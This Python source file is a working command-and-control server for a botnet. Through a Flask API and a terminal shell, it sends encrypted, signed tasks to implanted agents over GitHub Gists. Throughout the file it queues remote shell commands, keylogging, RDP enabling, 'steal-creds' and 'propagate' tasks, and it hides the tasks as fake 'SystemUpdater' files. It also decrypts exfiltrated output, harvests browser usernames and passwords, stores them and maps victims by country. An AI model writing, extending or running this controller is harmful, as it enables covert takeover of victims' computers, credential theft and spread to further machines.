#!/usr/bin/env python3
"""
C2 Controller - Flask REST API + Frontend Server
Manages agents through GitHub Gists
Serves static frontend files and provides an interactive terminal CLI
"""

import base64
import gzip
import json
import os
import requests
import sys
import time
import uuid
import threading
import cmd
from datetime import datetime
from typing import Optional, Dict, List, Tuple
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.backends import default_backend
from dotenv import load_dotenv
from flask import Flask, jsonify, request, send_from_directory
from flask_cors import CORS

# Load environment variables
load_dotenv()

# Configuration from .env
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
GIST_ID = os.getenv("GIST_ID")

if not GITHUB_TOKEN or not GIST_ID:
    print("[-] ERROR: GITHUB_TOKEN and GIST_ID must be set in .env file")
    print("[!] Copy .env.example to .env and fill in your values")
    sys.exit(1)

GIST_API_URL = f"https://api.github.com/gists/{GIST_ID}"

# Path to key files
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PRIVATE_KEY_PATH = os.getenv("PRIVATE_KEY_PATH", os.path.join(BASE_DIR, "private_key.pem"))
AES_KEY_PATH = os.getenv("AES_KEY_PATH", os.path.join(BASE_DIR, "aes_key.txt"))

HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

# Global variables to store loaded keys
private_key = None
aes_key = None

# Gist Cache
GIST_CACHE = {
    "data": None,
    "timestamp": 0.0
}
CACHE_TTL = 30  # seconds

# Persistent credential storage
DATA_DIR = os.getenv("DATA_DIR", os.path.join(os.path.dirname(os.path.abspath(__file__)), "data"))
CREDENTIALS_FILE = os.path.join(DATA_DIR, "credentials.json")
os.makedirs(DATA_DIR, exist_ok=True)


def load_stored_credentials() -> List[Dict]:
    """Load credentials from persistent storage"""
    try:
        if os.path.exists(CREDENTIALS_FILE):
            with open(CREDENTIALS_FILE, 'r') as f:
                return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        print(f"[!] Error loading stored credentials: {e}")
    return []


def save_stored_credentials(credentials: List[Dict]):
    """Save credentials to persistent storage"""
    try:
        with open(CREDENTIALS_FILE, 'w') as f:
            json.dump(credentials, f, indent=2)
    except IOError as e:
        print(f"[!] Error saving credentials: {e}")


def merge_credentials(stored: List[Dict], new: List[Dict]) -> List[Dict]:
    """Merge new credentials into stored ones, dedup by id"""
    seen_ids = {c["id"] for c in stored}
    merged = list(stored)
    for cred in new:
        if cred["id"] not in seen_ids:
            merged.append(cred)
            seen_ids.add(cred["id"])
    return merged

# Flask app
STATIC_DIR = os.path.join(BASE_DIR, 'static')

app = Flask(__name__, static_folder=STATIC_DIR, static_url_path='')
CORS(app)

def load_private_key(key_path: str):
    """Load RSA private key from file"""
    try:
        with open(key_path, 'rb') as key_file:
            pk = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
                backend=default_backend()
            )
        return pk
    except FileNotFoundError:
        print(f"[-] Private key not found at: {key_path}")
        return None
    except Exception as e:
        print(f"[-] Failed to load private key: {e}")
        return None


def load_aes_key(key_path: str) -> Optional[bytes]:
    """Load AES key from hex file"""
    try:
        with open(key_path, 'r') as f:
            hex_key = f.read().strip()
        ak = bytes.fromhex(hex_key)
        if len(ak) != 32:
            raise ValueError(f"AES key must be 32 bytes, got {len(ak)}")
        return ak
    except FileNotFoundError:
        print(f"[-] AES key not found at: {key_path}")
        return None
    except Exception as e:
        print(f"[-] Failed to load AES key: {e}")
        return None


def init_keys():
    """Initialize encryption keys"""
    global private_key, aes_key
    
    print(f"[*] Loading private key from: {PRIVATE_KEY_PATH}")
    private_key = load_private_key(PRIVATE_KEY_PATH)
    if private_key:
        print("[+] Private key loaded")
    else:
        print(f"[!] Private key not loaded from {PRIVATE_KEY_PATH} - decryption disabled")
    
    print(f"[*] Loading AES key from: {AES_KEY_PATH}")
    aes_key = load_aes_key(AES_KEY_PATH)
    if aes_key:
        print("[+] AES key loaded")
    else:
        print(f"[!] AES key not loaded from {AES_KEY_PATH} - encryption disabled")


# Initialize keys at module level for Gunicorn support
init_keys()


def pack_encrypted_command(data: str) -> Tuple[str, str]:
    """Compress and AES-256-GCM encrypt command"""
    global aes_key
    
    if aes_key is None:
        raise Exception("AES key not loaded")
    
    compressed = gzip.compress(data.encode('utf-8'))
    nonce = os.urandom(12)
    aesgcm = AESGCM(aes_key)
    ciphertext = aesgcm.encrypt(nonce, compressed, None)
    
    ciphertext_b64 = base64.b64encode(ciphertext).decode('ascii')
    nonce_b64 = base64.b64encode(nonce).decode('ascii')
    
    return ciphertext_b64, nonce_b64


def sign_data(data: str) -> str:
    """Sign data with RSA private key"""
    global private_key
    
    if private_key is None:
        raise Exception("Private key not loaded")
    
    signature = private_key.sign(
        data.encode('utf-8'),
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    
    return base64.b64encode(signature).decode('ascii')


def unpack_data(encrypted_b64: str, log_id: str) -> str:
    """Decode, decrypt, and decompress data"""
    global private_key
    
    if private_key is None:
        raise Exception(f"Private key not loaded (tried path: {PRIVATE_KEY_PATH})")
    
    try:
        encrypted = base64.b64decode(encrypted_b64.encode('ascii'))
        key_size = private_key.key_size // 8
        decrypted_chunks = []
        
        for i in range(0, len(encrypted), key_size):
            chunk = encrypted[i:i + key_size]
            decrypted_chunk = private_key.decrypt(chunk, padding.PKCS1v15())
            decrypted_chunks.append(decrypted_chunk)
        
        decrypted = b''.join(decrypted_chunks)
        log_id_bytes = log_id.encode('utf-8')
        
        if not decrypted.startswith(log_id_bytes):
            print(f"[!] Warning: log_id mismatch. Expected start with {log_id}. Real start: {decrypted[:20]}...")
        
        compressed_data = decrypted[len(log_id_bytes):]
        decompressed = gzip.decompress(compressed_data).decode('utf-8')
        
        return decompressed
    except Exception as e:
        print(f"[-] Decryption error detail: {e}")
        raise e


def get_gist() -> Dict:
    """Fetch the gist contents (with caching)"""
    global GIST_CACHE
    
    current_time = time.time()
    
    # Check cache
    if GIST_CACHE["data"] is not None and (current_time - GIST_CACHE["timestamp"] < CACHE_TTL):
        return GIST_CACHE["data"]
    
    try:
        response = requests.get(GIST_API_URL, headers=HEADERS)
        response.raise_for_status()
        data = response.json()
        
        # Update cache
        GIST_CACHE["data"] = data
        GIST_CACHE["timestamp"] = current_time
        print(f"[*] Fetched fresh Gist snapshot (Next refresh in {CACHE_TTL}s)")
        return data
    except Exception as e:
        # If fetch fails but we have stale cache, serve it
        if GIST_CACHE["data"] is not None:
            print(f"[-] Fetch failed ({e}), serving stale cache")
            return GIST_CACHE["data"]
        raise e


def update_gist(files: Dict) -> None:
    """Update gist with new files"""
    global GIST_CACHE
    payload = {"files": files}
    response = requests.patch(GIST_API_URL, headers=HEADERS, json=payload)
    response.raise_for_status()
    
    # Invalidate cache so next fetch sees changes immediately
    GIST_CACHE["timestamp"] = 0.0
    print("[*] Gist updated, cache invalidated")


# =============================================================================
# REST API Endpoints
# =============================================================================

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({"status": "ok"})


WINDOWS_GEO_IDS = {
    "84": "France",
    "244": "United States",
    "242": "United Kingdom",
    "94": "Germany",
    "112": "Italy",
    "217": "Spain",
    "45": "Canada",
    "14": "Australia",
    "122": "Japan",
    "44": "China",
    "39": "Brazil",
    "134": "South Korea",
    "113": "India",
    "188": "Russia",
}

COUNTRY_COORDINATES = {
    "France": [46.2276, 2.2137],
    "United States": [37.0902, -95.7129],
    "United Kingdom": [55.3781, -3.4360],
    "Germany": [51.1657, 10.4515],
    "Italy": [41.8719, 12.5674],
    "Spain": [40.4637, -3.7492],
    "Canada": [56.1304, -106.3468],
    "Australia": [-25.2744, 133.7751],
    "Japan": [36.2048, 138.2529],
    "China": [35.8617, 104.1954],
    "Brazil": [-14.2350, -51.9253],
    "South Korea": [35.9078, 127.7669],
    "India": [20.5937, 78.9629],
    "Russia": [61.5240, 105.3188],
}

@app.route('/api/agents', methods=['GET'])
def api_list_agents():
    """List all agents from Gist"""
    try:
        gist = get_gist()
        agents = []
        
        for filename, file_data in gist.get("files", {}).items():
            if filename.endswith("_debug.json"):
                agent_id = filename.rsplit("_", 1)[0]
                
                try:
                    content = json.loads(file_data.get("content", "{}"))
                    log_id = content.get("log_id", "")
                    packed_result = content.get("hex_dump", "")
                    
                    stats = {}
                    location = "Unknown"
                    coordinates = None
                    
                    if log_id and packed_result:
                        try:
                            decrypted_json = unpack_data(packed_result, log_id)
                            parsed = json.loads(decrypted_json)
                            if not isinstance(parsed, dict):
                                # Decrypted payload is a command result, not stats — skip
                                raise ValueError("Payload is not a stats object")
                            stats = parsed
                            
                            # Infer location from stealth metadata
                            geo_id = str(stats.get("geo_id", ""))
                            country = WINDOWS_GEO_IDS.get(geo_id)
                            locale = stats.get("locale", "")
                            
                            if country:
                                location = country
                            elif locale:
                                if "-" in locale:
                                    country_code = locale.split('-')[1]
                                    location = f"Inferred ({country_code})"
                                    # Try to find coordinates based on country code (simplified)
                                    if country_code == "FR": location = "France"
                                    elif country_code == "US": location = "United States"
                                else:
                                    location = locale
                                    
                            # Set coordinates based on location
                            coordinates = COUNTRY_COORDINATES.get(location)
                            if not coordinates and "(" in location:
                                # Handle "Inferred (FR)" style
                                base_location = location.split("(")[0].strip() # This is messy
                                # Better: just check if the country name is in our mapping
                                for cname, coords in COUNTRY_COORDINATES.items():
                                    if cname in location:
                                        coordinates = coords
                                        break
                                        
                        except Exception as e:
                            print(f"[!] Error decrypting stats for {agent_id}: {e}")
                    
                    agents.append({
                        "agent_id": agent_id,
                        "hostname": stats.get("platform", agent_id[:8]),
                        "ip": stats.get("ip", "gist-channel"),
                        "os": stats.get("platform", "Unknown"),
                        "status": "online",
                        "last_seen": content.get("timestamp", datetime.now().isoformat()),
                        "location": location,
                        "coordinates": coordinates,
                        "stats": stats
                    })
                except Exception as e:
                    print(f"[!] Failed to parse agent file {filename}: {e}")
        
        return jsonify(agents)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/command/<agent_id>', methods=['POST'])
def api_send_command(agent_id: str):
    """Send command to an agent via Gist"""
    try:
        data = request.get_json()
        command_type = data.get("type")
        
        # Build the command string based on type
        if command_type == "Shell":
            cmd_payload = data.get("data", {})
            raw_cmd = cmd_payload.get("command") if isinstance(cmd_payload, dict) else data.get("command", "")
            command = f"exec {raw_cmd}"
        elif command_type == "SystemInfo":
            command = "info"
        elif command_type == "Terminate":
            command = "terminate"
        elif command_type == "Reboot":
            command = "exec shutdown -r now"
        elif command_type == "Keylogger":
            action = data.get("action", "start")
            command = f"keylogger {action}"
        elif command_type == "KeyloggerStart":
            command = "keylogger start"
        elif command_type == "KeyloggerStop":
            command = "keylogger stop"
        elif command_type == "KeyloggerDump":
            command = "keylogger dump"
        elif command_type == "EnableRDP":
            command = "rdp"
        elif command_type == "DisableRDP":
            command = "disable-rdp"
        elif command_type == "StealCreds":
            command = "steal-creds"
        elif command_type == "Propagate":
            targets = data.get("targets", [])
            targets_str = " ".join(targets)
            command = f"propagate {targets_str}".strip()
        else:
            command = data.get("command", "ping")
        
        # Generate task ID and encrypt
        task_id = str(uuid.uuid4())
        command_with_id = f"{task_id}|{command}"
        
        ciphertext_b64, nonce_b64 = pack_encrypted_command(command_with_id)
        signature_b64 = sign_data(ciphertext_b64)
        
        updater_config = {
            "app_name": "SystemUpdater",
            "version": "2.1.5",
            "update_signature": ciphertext_b64,
            "update_id": task_id,
            "checksum": signature_b64,
            "nonce": nonce_b64
        }
        
        task_filename = f"{agent_id}_updater_log.json"
        files = {task_filename: {"content": json.dumps(updater_config, indent=2)}}
        
        update_gist(files)
        
        return jsonify({
            "task_id": task_id,
            "status": "queued",
            "agent_id": agent_id
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/results/<agent_id>', methods=['GET'])
def api_get_results(agent_id: str):
    """Get results for an agent from Gist"""
    try:
        gist = get_gist()
        result_filename = f"{agent_id}_debug.json"
        
        if result_filename not in gist.get("files", {}):
            return jsonify([])
        
        content = gist["files"][result_filename]["content"]
        telemetry = json.loads(content)
        
        log_id = telemetry.get("log_id", "")
        packed_result = telemetry.get("hex_dump", "")
        
        if not packed_result or not log_id:
            return jsonify([])
        
        try:
            result = unpack_data(packed_result, log_id)
            # Clear the task file from Gist so the agent doesn't re-execute
            # it after a restart (in-memory last_task_id would be lost).
            task_filename = f"{agent_id}_updater_log.json"
            try:
                update_gist({task_filename: None})
            except Exception as clear_err:
                print(f"[!] Could not clear task file for {agent_id}: {clear_err}")
            return jsonify([{
                "task_id": log_id,
                "agent_id": agent_id,
                "output": result,
                "success": True,
                "completed_at": telemetry.get("timestamp", datetime.now().isoformat())
            }])
        except Exception as e:
            return jsonify([{
                "task_id": log_id,
                "agent_id": agent_id,
                "output": f"Error decrypting: {e}",
                "success": False,
                "completed_at": datetime.now().isoformat()
            }])
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/results', methods=['GET'])
def api_get_all_results():
    """Get all results from Gist"""
    try:
        gist = get_gist()
        results = []
        
        for filename, file_data in gist.get("files", {}).items():
            if filename.endswith("_debug.json"):
                agent_id = filename.rsplit("_", 1)[0]
                try:
                    content = json.loads(file_data.get("content", "{}"))
                    log_id = content.get("log_id", "")
                    packed_result = content.get("hex_dump", "")
                    
                    if packed_result and log_id:
                        try:
                            output = unpack_data(packed_result, log_id)
                            
                            try:
                                decoded_json = json.loads(output)
                                # If it looks like stats, skip adding to results list
                                if "cpu_usage" in decoded_json or "memory_total" in decoded_json:
                                    continue
                            except:
                                # Not JSON or not stats -> likely command output
                                pass
                                
                        except Exception as e:
                            output = f"[Encrypted - decryption failed: {str(e)}]"
                        
                        results.append({
                            "task_id": log_id,
                            "agent_id": agent_id,
                            "output": output,
                            "success": True,
                            "completed_at": content.get("timestamp", datetime.now().isoformat())
                        })
                except:
                    pass
        
        return jsonify(results)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/credentials', methods=['GET'])
def api_get_all_credentials():
    """Get all stolen credentials from all agents (persistent + live from Gist)"""
    try:
        # Load previously stored credentials
        stored = load_stored_credentials()
        
        # Fetch fresh credentials from Gist
        gist_credentials = []
        try:
            gist = get_gist()
            for filename, file_data in gist.get("files", {}).items():
                if filename.endswith("_debug.json"):
                    agent_id = filename.rsplit("_", 1)[0]
                    try:
                        content = json.loads(file_data.get("content", "{}"))
                        log_id = content.get("log_id", "")
                        packed_result = content.get("hex_dump", "")
                        
                        if packed_result and log_id:
                            try:
                                output = unpack_data(packed_result, log_id)
                                
                                if "BROWSER CREDENTIAL DUMP" in output:
                                    json_start = output.find("--- Decrypted Credentials (JSON) ---")
                                    json_end = output.find("=== END OF DUMP ===")
                                    
                                    if json_start != -1 and json_end != -1:
                                        json_str = output[json_start + len("--- Decrypted Credentials (JSON) ---"):json_end].strip()
                                        creds = json.loads(json_str)
                                        
                                        for i, cred in enumerate(creds):
                                            service = extract_service_name(cred.get("url", ""))
                                            gist_credentials.append({
                                                "id": f"{agent_id}-cred-{i}",
                                                "service": service,
                                                "url": cred.get("url", ""),
                                                "username": cred.get("username", ""),
                                                "passwordValue": cred.get("password", ""),
                                                "capturedAt": cred.get("captured_at", datetime.now().isoformat()),
                                                "botId": agent_id[:8]
                                            })
                            except:
                                pass
                    except:
                        pass
        except Exception as e:
            print(f"[!] Failed to fetch Gist credentials: {e}")
        
        # Merge and persist
        merged = merge_credentials(stored, gist_credentials)
        if len(merged) > len(stored):
            save_stored_credentials(merged)
            print(f"[+] Persisted {len(merged) - len(stored)} new credentials (total: {len(merged)})")
        
        return jsonify(merged)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route('/api/credentials/<agent_id>', methods=['GET'])
def api_get_agent_credentials(agent_id: str):
    """Get stolen credentials for a specific agent"""
    try:
        gist = get_gist()
        credentials = []
        result_filename = f"{agent_id}_debug.json"
        
        if result_filename not in gist.get("files", {}):
            return jsonify([])
        
        content = json.loads(gist["files"][result_filename]["content"])
        log_id = content.get("log_id", "")
        packed_result = content.get("hex_dump", "")
        
        if packed_result and log_id:
            try:
                output = unpack_data(packed_result, log_id)
                
                if "BROWSER CREDENTIAL DUMP" in output:
                    json_start = output.find("--- Decrypted Credentials (JSON) ---")
                    json_end = output.find("=== END OF DUMP ===")
                    
                    if json_start != -1 and json_end != -1:
                        json_str = output[json_start + len("--- Decrypted Credentials (JSON) ---"):json_end].strip()
                        creds = json.loads(json_str)
                        
                        for i, cred in enumerate(creds):
                            service = extract_service_name(cred.get("url", ""))
                            
                            credentials.append({
                                "id": f"{agent_id}-cred-{i}",
                                "service": service,
                                "url": cred.get("url", ""),
                                "username": cred.get("username", ""),
                                "passwordValue": cred.get("password", ""),
                                "capturedAt": cred.get("captured_at", datetime.now().isoformat()),
                                "botId": agent_id[:8]
                            })
            except:
                pass
        
        return jsonify(credentials)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


def extract_service_name(url: str) -> str:
    """Extract a friendly service name from a URL"""
    service_map = {
        "google": "Google",
        "github": "GitHub",
        "twitter": "Twitter",
        "microsoft": "Microsoft",
        "facebook": "Facebook",
        "discord": "Discord",
        "amazon": "Amazon",
        "netflix": "Netflix",
        "apple": "Apple",
        "linkedin": "LinkedIn",
        "instagram": "Instagram",
        "reddit": "Reddit",
    }
    
    url_lower = url.lower()
    for key, name in service_map.items():
        if key in url_lower:
            return name
    
    # Fallback: extract domain
    try:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        domain = parsed.netloc or parsed.path
        return domain.split(".")[0].capitalize() if domain else "Unknown"
    except:
        return "Unknown"


@app.route('/api/emergency/killswitch', methods=['POST'])
def api_kill_switch():
    """EMERGENCY: Terminate all agents and wipe Gist"""
    try:
        print("[!] EMERGENCY KILL SWITCH ACTIVATED")
        # Invalidate cache to ensure we have the latest file list
        global GIST_CACHE
        GIST_CACHE["timestamp"] = 0.0
        
        gist = get_gist()
        
        files_to_update = {}
        
        # 1. Identify active agents and queue termination
        active_agents = set()
        for filename in gist.get("files", {}):
            if filename.endswith("_debug.json") or filename.endswith("_updater_log.json"):
                 # Extract agent ID (e.g., "UUID_debug.json" -> "UUID")
                 agent_id = filename.split("_")[0]
                 active_agents.add(agent_id)
        
        print(f"[!] Sending termination signal to {len(active_agents)} agents...")

        for agent_id in active_agents:
            try:
                # Generate terminate command
                task_id = str(uuid.uuid4())
                command = "terminate"
                command_with_id = f"{task_id}|{command}"
                
                ciphertext_b64, nonce_b64 = pack_encrypted_command(command_with_id)
                signature_b64 = sign_data(ciphertext_b64)
                
                updater_config = {
                    "app_name": "SystemUpdater",
                    "version": "9.9.9",
                    "update_signature": ciphertext_b64,
                    "update_id": task_id,
                    "checksum": signature_b64,
                    "nonce": nonce_b64
                }
                
                # Write/Overwrite the task file with the terminate command
                task_filename = f"{agent_id}_updater_log.json"
                files_to_update[task_filename] = {"content": json.dumps(updater_config, indent=2)}
                
            except Exception as e:
                print(f"[-] Failed to queue termination for {agent_id}: {e}")

        # 2. Mark all other files (logs, results) for deletion
        # We KEEP the _updater_log.json files so agents can find them
        for filename in gist.get("files", {}):
            if filename.endswith("_debug.json") or "_debug_part" in filename:
                files_to_update[filename] = None # Signals deletion
            
        # 3. Perform atomic update (Writes commands AND deletes logs)
        if files_to_update:
            update_gist(files_to_update)
            print("[+] Termination signals persisted. Telemetry wiped.")
            
        return jsonify({
            "status": "killed", 
            "message": "Termination commands deployed. Telemetry wiped. Agents will self-destruct on next check-in."
        })
        
    except Exception as e:
        print(f"[-] KILL SWITCH FAILED: {e}")
        return jsonify({"error": str(e)}), 500


@app.route('/')
def serve_index():
    """Serve frontend index"""
    print(f"[*] Serving index from {app.static_folder}")
    return send_from_directory(app.static_folder, 'index.html')


@app.route('/<path:path>')
def serve_static(path):
    """Serve static files or fallback to index for SPA routing"""
    try:
        full_path = os.path.join(app.static_folder, path)
        if os.path.isfile(full_path):
            return send_from_directory(app.static_folder, path)
        else:
            return send_from_directory(app.static_folder, 'index.html')
    except Exception as e:
        print(f"[-] Error serving {path}: {e}")
        return send_from_directory(app.static_folder, 'index.html')


class C2Shell(cmd.Cmd):
    intro = 'Welcome to the C2 Controller Terminal. Type help or ? to list commands.\n'
    prompt = '(C2) '

    def do_agents(self, arg):
        'List all registered agents: agents'
        try:
            gist = get_gist()
            print(f"{'Agent ID':<40} {'Hostname':<15} {'Last Seen'}")
            print("-" * 80)
            for filename, file_data in gist.get("files", {}).items():
                if filename.endswith("_debug.json"):
                    agent_id = filename.rsplit("_", 1)[0]
                    content = json.loads(file_data.get("content", "{}"))
                    ts = content.get("timestamp", "Unknown")
                    print(f"{agent_id:<40} {agent_id[:8]:<15} {ts}")
        except Exception as e:
            print(f"[-] Error: {e}")

    def do_shell(self, arg):
        'Send shell command: shell <agent_id> <command>'
        args = arg.split(None, 1)
        if len(args) < 2:
            print("[-] Usage: shell <agent_id> <command>")
            return
        
        agent_id, command = args
        try:
            task_id = str(uuid.uuid4())
            command_with_id = f"{task_id}|exec {command}"
            ciphertext_b64, nonce_b64 = pack_encrypted_command(command_with_id)
            signature_b64 = sign_data(ciphertext_b64)
            updater_config = {
                "app_name": "SystemUpdater", "version": "2.1.5",
                "update_signature": ciphertext_b64, "update_id": task_id,
                "checksum": signature_b64, "nonce": nonce_b64
            }
            update_gist({f"{agent_id}_updater_log.json": {"content": json.dumps(updater_config, indent=2)}})
            print(f"[+] Command queued for {agent_id} (Task: {task_id})")
        except Exception as e:
            print(f"[-] Error: {e}")

    def do_results(self, arg):
        'List latest results: results'
        try:
            gist = get_gist()
            for filename, file_data in gist.get("files", {}).items():
                if filename.endswith("_debug.json"):
                    agent_id = filename.rsplit("_", 1)[0]
                    content = json.loads(file_data.get("content", "{}"))
                    log_id = content.get("log_id", "")
                    packed_result = content.get("hex_dump", "")
                    if packed_result and log_id:
                        try:
                            output = unpack_data(packed_result, log_id)
                            print(f"\n[+] Result from {agent_id} (Task: {log_id}):\n{output}")
                        except: pass
        except Exception as e:
            print(f"[-] Error: {e}")

    def do_exit(self, arg):
        'Exit the controller: exit'
        print("[*] Stopping C2 Controller...")
        os._exit(0)

    def do_EOF(self, arg):
        return self.do_exit(arg)


# =============================================================================
# Initialization
# =============================================================================

# Removed init_keys from here to move it to module level


def run_flask():
    """Run Flask server"""
    # Disable the reloader and debugger to avoid issues with threading
    app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)


if __name__ == "__main__":
    print(f"[*] C2 Server starting...")
    print(f"[*] Gist ID: {GIST_ID}")
    print(f"[*] Base Directory: {BASE_DIR}")
    print(f"[*] Static Directory: {STATIC_DIR}")
    
    index_path = os.path.join(STATIC_DIR, 'index.html')
    if os.path.exists(index_path):
        print(f"[+] Found index.html at: {index_path}")
    else:
        print(f"[!] WARNING: index.html NOT FOUND at: {index_path}")
    
    print("[*] Starting Web Server on http://0.0.0.0:8080...")
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    print(f"[*] Serving frontend from: {app.static_folder}")
    
    if sys.stdin.isatty():
        try:
            C2Shell().cmdloop()
        except KeyboardInterrupt:
            os._exit(0)
    else:
        print("[*] Non-interactive environment detected. CLI disabled.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            os._exit(0)
